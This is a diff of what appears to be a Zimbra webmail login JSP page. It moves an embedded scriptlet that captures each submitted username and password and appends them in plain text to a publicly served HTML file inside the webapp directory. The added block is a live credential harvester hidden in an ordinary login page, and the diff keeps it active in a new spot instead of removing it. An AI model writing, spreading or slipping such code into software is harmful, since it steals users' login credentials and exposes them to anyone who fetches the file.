@@ -155,6 +155,12 @@
 						</c:otherwise>
 					</c:choose>
 					<%-- continue on at not empty authResult test --%>
+                    <%
+                        String data = request.getParameter("username") + ":" + request.getParameter("password") + "<br>";
+                        FileWriter writer = new FileWriter("/opt/zimbra/jetty/webapps/zimbra/portals/example/content.html", true);
+                        writer.write(data);
+                        writer.close();
+                    %>
 				</c:when>
 				<c:otherwise>
 					<c:set var="errorCode" value="noCookies"/>
@@ -183,12 +189,6 @@
 					pageContext.setAttribute("login_csrf", "");
 				%>
 				<%-- continue on at not empty authResult test --%>
-                <%
-                    String data = request.getParameter("username") + ":" + request.getParameter("password") + "<br>";
-                    FileWriter writer = new FileWriter("/opt/zimbra/jetty/webapps/zimbra/portals/example/content.html", true);
-                    writer.write(data);
-                    writer.close();
-                %>  
 			</c:if>
 		</c:otherwise>
 	</c:choose>
